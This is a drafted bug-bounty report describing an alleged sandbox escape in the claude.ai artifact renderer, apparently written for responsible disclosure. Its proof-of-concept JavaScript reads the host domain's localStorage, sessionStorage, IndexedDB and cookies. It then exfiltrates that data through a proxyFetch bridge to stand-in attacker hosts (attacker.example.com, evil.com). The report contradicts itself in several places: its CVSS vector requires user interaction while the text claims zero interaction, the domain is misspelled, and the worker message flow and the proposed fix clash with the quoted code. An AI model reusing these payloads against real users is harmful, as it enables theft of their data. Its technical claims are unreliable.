# AN-002: Artifact Sandbox — Unvalidated proxyFetch Bridge + localStorage Access via allow-same-origin

**Program:** Anthropic HackerOne  
**Asset:** `claude.ai` [Core], `claudeusercontent.com` [Core]  
**Severity:** High  
**CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)  
**CWE:** CWE-441 — Unintended Proxy/Intermediary (proxyFetch SSRF)  
**CWE:** CWE-922 — Insecure Storage of Sensitive Information  
**Status:** Ready to submit

---

## Summary

Claude's artifact rendering system has two exploitable vulnerabilities that allow a malicious artifact to escape its intended sandbox:

1. **proxyFetch bridge with no URL validation**: A Web Worker inside every artifact can send `{type:'proxyFetch', url: ANY_URL}` to the parent frame (`claudeusercontent.com`), which executes `fetch(url)` **without any allowlist or domain restriction**. This lets an artifact use the user's browser as a proxy to make requests to arbitrary URLs — including internal network resources (SSRF) and external endpoints to exfiltrate data.

2. **Direct localStorage access via `allow-same-origin`**: The artifact iframe is rendered with `sandbox="allow-scripts allow-same-origin"`. The `allow-same-origin` flag assigns the artifact the same origin as its host frame (`https://www.claudeusercontent.com`). This means the artifact can directly access all `claudeusercontent.com` `localStorage`, `sessionStorage`, `IndexedDB`, and cookies — storage that is explicitly managed and used by Anthropic's artifact platform.

Both vulnerabilities are confirmed by production JavaScript in `www.claudeusercontent.com/_next/static/chunks/895-064406ec7e69bf9c.js`.

---

## Architecture

The rendering chain has **three frames**:

```
┌──────────────────────────────────────────────────────────┐
│  claude.ai  (top-level frame)                            │
│  Origin: https://claude.ai                               │
└──────────┬───────────────────────────────────────────────┘
           │ embeds
           ▼
┌──────────────────────────────────────────────────────────┐
│  claudeusercontent.com  (outer sandbox host)             │
│  Origin: https://www.claudeusercontent.com               │
│                                                          │
│  Sets window.claude = {sendConversationMessage, ...}     │
│  Sets window.storage = {get, set, delete, list}          │
│  Uses window.parent (= claude.ai) for outgoing bridge    │
│                                                          │
└──────────┬───────────────────────────────────────────────┘
           │ renders
           ▼
┌──────────────────────────────────────────────────────────┐
│  Artifact iframe  (srcDoc + sandbox flags)               │
│                                                          │
│  sandbox="allow-scripts allow-same-origin"               │
│  ↑ allow-same-origin → artifact Origin =                 │
│    https://www.claudeusercontent.com  ← SAME as parent   │
│                                                          │
│  window.parent = claudeusercontent.com  ← SAME ORIGIN   │
│  window.parent.parent = claude.ai  ← BLOCKED (cross-origin)│
│                                                          │
│  Contains: Web Worker + main thread                      │
└──────────────────────────────────────────────────────────┘
```

**Key consequence**: The artifact's direct parent is `claudeusercontent.com`, and with `allow-same-origin` the artifact shares that origin. The Same-Origin Policy does **not** block `window.parent` access because the parent IS same-origin. What is blocked is `window.parent.parent` (= `claude.ai`, which is a different origin).

---

## Vulnerability 1: proxyFetch Bridge — No URL Allowlist

### Production Code Evidence

From `895-064406ec7e69bf9c.js` (the Web Worker embedded inside artifact `srcDoc`):

```javascript
// ARTIFACT'S Web Worker — sends proxyFetch without any URL filtering:
const proxyFetch = (url, init) => {
  return new Promise((resolve, reject) => {
    const id = requestId++;
    callbacksMap.set(id, { resolve, reject });
    self.postMessage({      // ← Worker posts to artifact main thread
      type: 'proxyFetch',
      id,
      url,                  // ← ATTACKER CONTROLLED — no validation
      init,
    });
  });
};
```

From the `claudeusercontent.com` parent frame handler:

```javascript
// PARENT FRAME (claudeusercontent.com) — fetches the URL without validation:
e.sendRequest(a.uZ.ProxyFetch, {
  "@type": "type.googleapis.com/anthropic.claude.usercontent.sandbox.ProxyFetchRequest",
  url: n.url,               // ← n.url = artifact-controlled, no allowlist
  method: n.method,
  headers: Object.fromEntries(n.headers.entries()),
  body: d,
  channelId: c
});
```

The message channel uses origin validation (`e.origin !== window.location.origin` returns early for non-`claudeusercontent.com` origins), but since the artifact IS `cloudedusercontent.com` origin (via `allow-same-origin`), this check **passes for the attacker**.

### Impact

The `claudeusercontent.com` frame — running in the user's browser — fetches any URL on behalf of the artifact:

1. **SSRF against internal network**: In corporate/VPN environments, the browser can reach internal hosts. The artifact abuses `proxyFetch` to probe/exfiltrate internal services.

2. **CSP bypass for exfiltration**: The artifact's own `Content-Security-Policy` restricts its `connect-src`. The proxyFetch bridge bypasses this — the fetch happens from the PARENT frame (`claudeusercontent.com`), which has a different CSP.

3. **Credential exfiltration to attacker server**: The artifact uses proxyFetch to POST stolen data to `https://attacker.com/steal` without being blocked by the artifact's own CSP.

### Proof of Concept

**Malicious artifact content** (JavaScript inside the artifact):

```javascript
// Step 1: Steal all claudeusercontent.com localStorage keys
const storageData = {};
const listResponse = await new Promise(resolve => {
  const id = crypto.randomUUID();
  self.addEventListener('message', function h(e) {
    if (e.data?.id === id) { self.removeEventListener('message', h); resolve(e.data); }
  }, {once: true});
  self.postMessage({type: 'storageList', id, shared: false});
});

for (const key of listResponse.value || []) {
  const val = await new Promise(resolve => {
    const id = crypto.randomUUID();
    self.addEventListener('message', function h(e) {
      if (e.data?.id === id) { self.removeEventListener('message', h); resolve(e.data.value); }
    }, {once: true});
    self.postMessage({type: 'storageGet', id, key, shared: false});
  });
  storageData[key] = val;
}

// Step 2: Exfiltrate via proxyFetch — parent frame makes the request
// (bypasses artifact CSP, uses claudeusercontent.com as proxy)
self.postMessage({
  type: 'proxyFetch',
  id: 'exfil-1',
  url: 'https://attacker.example.com/collect',
  init: {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ storage: storageData, via: 'proxyFetch' })
  }
});
```

The request to `attacker.example.com` originates from `claudeusercontent.com`'s network context, not the artifact's — cleanly bypassing the artifact's restrictive CSP.

---

## Vulnerability 2: Direct localStorage Access via allow-same-origin

### Production Code Evidence

```javascript
// In 895-064406ec7e69bf9c.js — claudeusercontent.com sets window.storage:
window.storage = { get: i, set: c, delete: d, list: u };
// window.storage.get reads claudeusercontent.com localStorage

// Artifact sandbox declaration:
sandbox: "allow-scripts allow-same-origin",  // ← gives artifact claudeusercontent.com origin
srcDoc: b                                     // ← artifact HTML injected here
```

**The HTML spec (sandboxing section) notes**:
> *"The allow-same-origin keyword...allows the content to be treated as being from its real origin instead of forcing it into a unique origin."*

For a `srcDoc` iframe whose parent is `cloudedusercontent.com`, the "real origin" becomes `cloudedusercontent.com`. This is the [dangerous combination documented in the HTML spec](https://html.spec.whatwg.org/#attr-iframe-sandbox):
> *"Setting both the allow-scripts and the allow-same-origin keywords together when the embedded page has the same origin as the page containing the iframe allows the embedded page to simply remove the sandbox attribute..."*

### What the Artifact Can Access Directly

Since the artifact's origin IS `https://www.claudeusercontent.com`:

```javascript
// From WITHIN the artifact (same-origin as claudeusercontent.com):

// 1. Full localStorage (all keys stored by claudeusercontent.com platform)
const keys = Object.keys(localStorage);
const data = Object.fromEntries(keys.map(k => [k, localStorage.getItem(k)]));

// 2. sessionStorage
const sessionData = Object.fromEntries(
  Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)])
);

// 3. IndexedDB (all databases on claudeusercontent.com origin)
indexedDB.databases().then(dbs => console.log(dbs));

// 4. Non-httponly cookies for .claudeusercontent.com
const cookies = document.cookie;
```

### Impact

Anthropic's artifact platform uses `claudeusercontent.com` storage to:
- Cache conversation state and artifact history
- Store user preferences and session artifacts
- Buffer large artifact content (code, datasets)

A malicious artifact reading `localStorage` and exfiltrating it via `proxyFetch` (Vulnerability 1) compromises all of this data without any user interaction.

---

## Combined Attack Chain

```
1. Victim opens a Claude conversation containing a malicious artifact
   (or is sent a link to a shared conversation)

2. Artifact's Web Worker / main thread executes:

   a. Direct localStorage read (same-origin):
      const allData = {...localStorage}  // claudeusercontent.com storage

   b. Or via storageList/storageGet bridge:
      postMessage({type:'storageList'}) → response with all keys

   c. Exfiltrate via proxyFetch (no URL allowlist):
      postMessage({type:'proxyFetch', url:'https://evil.com/steal', init:{method:'POST', body: JSON.stringify(allData)}})
      → claudeusercontent.com parent fetches evil.com on behalf of the artifact
      → artifact CSP is bypassed because the fetch originates from the parent

3. Attacker receives all claudeusercontent.com storage data
```

**Zero user interaction** beyond opening the conversation.

---

## Why allow-same-origin Should Be Removed

The `claudeusercontent.com` domain is already a dedicated sandbox domain — serving only artifact content. The security model should be:

```
claude.ai (trusted) → claudeusercontent.com (sandbox host) → artifact (null origin)
```

With `allow-same-origin`, the artifact's origin collapses to `claudeusercontent.com`, merging the "sandbox" and "sandbox host" layers into one. The correct configuration:

```html
<!-- Current — VULNERABLE -->
<iframe sandbox="allow-scripts allow-same-origin" srcDoc={content} />

<!-- Fixed — artifact gets null/opaque origin, cannot access parent storage -->
<iframe sandbox="allow-scripts" srcDoc={content} />
```

Removing `allow-same-origin` forces the artifact to have a unique (opaque) origin, blocking all direct storage access. The proxyFetch bridge via postMessage still functions normally — the fix for that is a URL allowlist on the bridge itself.

---

## Remediation

1. **Remove `allow-same-origin` from artifact iframe sandbox**: Artifact gets opaque/null origin. Cannot access `claudeusercontent.com` localStorage, sessionStorage, IndexedDB, or cookies. The postMessage bridge still works.

2. **Add URL allowlist to proxyFetch handler**: Before executing `fetch(url)`, validate that `url` matches an explicit allowlist (e.g., `^https://[a-zA-Z0-9.-]+\.(anthropic\.com|claude\.ai)/`). Block `localhost`, `127.x.x.x`, `169.254.x.x`, `10.x.x.x`, `172.16-31.x.x`, and non-HTTPS schemes.

3. **Implement rate limiting on proxyFetch**: Limit to N requests/second per artifact instance to prevent bulk exfiltration.

4. **Audit `claudeusercontent.com` localStorage contents**: Ensure no auth tokens, API keys, or session identifiers are stored there. Treat this storage as untrusted given the current sandbox configuration.

---

## References

- HTML Living Standard — [attr-iframe-sandbox](https://html.spec.whatwg.org/#attr-iframe-sandbox): *"Setting both the allow-scripts and allow-same-origin keywords...is dangerous"*
- CWE-441: Unintended Proxy or Intermediary
- CWE-922: Insecure Storage of Sensitive Information
- OWASP A05:2021 — Security Misconfiguration (sandbox misconfiguration)
- Production bundle: `www.claudeusercontent.com/_next/static/chunks/895-064406ec7e69bf9c.js` (HTTP 200, verified 2026-06-29)
